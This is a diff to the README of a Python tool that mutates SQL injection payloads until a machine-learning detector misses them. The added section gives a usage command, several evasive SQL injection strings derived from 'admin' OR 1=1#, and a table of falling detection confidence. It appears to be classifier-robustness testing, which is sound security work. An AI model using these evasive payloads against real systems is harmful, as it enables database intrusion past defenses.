@@ -1,4 +1,4 @@
-# pîrebok (from Kurdish "witch") - a guided adversarial fuzzer
+# pîrebok (from Kurdish "witch") - a guided adversarial fuzzer with evolutionary search
 
 
 [![pypi](https://img.shields.io/pypi/v/pirebok.svg)](https://pypi.org/project/pirebok/)
@@ -13,11 +13,46 @@
 * PyPI: <https://pypi.org/project/pirebok/>
 * Free software: MIT
 
+## How it works
+
+Give it a payload. It mutates it until it bypasses the classifier.
+
+```bash
+pirebok -f GuidedRandomSqlFuzzer -p "admin' OR 1=1#" -s 5 -q
+```
+
+```
+"admin' OR%001313<>1314#"
+'admin\'/*%%0x9*/|| 1=1 || "iD" NOT LIKE "iD"#'
+"ADmIn'/*>SQN*//**//*h[xI*/or/*p*//**/0X1=0X1#s<"
+'AdMin\'\x0c|| "b"<>"bV"#;YR\x0b'
+'aDMin\'||"Mce"%%231BF7%%0ALiKE%00"McE"#>wgpxX'
+```
+
+The original `admin' OR 1=1#` is classified as **sqli with 100% confidence**. After evolutionary mutations, the classifier misclassifies them as xss with confidence dropping to **0.48** - below the detection threshold.
+
+| Confidence | Classification | Payload |
+|---|---|---|
+| 1.0000 | sqli | `admin' OR 1=1#` |
+| 0.7808 | xss | `admin'/*PCvp<a*/\|\|%000x1=0x1#i>` |
+| 0.4785 | xss | `ADmiN'%%0x39441%%0aOr/**/'Te'<>'TeD'#-HLa.` |
+
+## Install
+
+```bash
+pip install pirebok
+
+# for guided mode (requires metamaska)
+pip install pirebok[guided]
+```
 
 ## Features
 - Random generic fuzzer w/ multiple transformers
 - Random sql fuzzer w/ multiple transformers
-- Guided random sql fuzzer w/ multiple transformers and [metamaska](https://github.com/HappyHackingSpace/metamaska)
+- Guided random sql fuzzer w/ iterative evolutionary search and [metamaska](https://github.com/HappyHackingSpace/metamaska)
+  - Priority-queue-based payload pool ranked by confidence
+  - Configurable `max_rounds`, `round_size`, and `timeout`
+- Random comment injection transformer (`/**/` at token boundaries)
 
 ## Credits
 - [Cookiecutter](https://github.com/audreyr/cookiecutter)
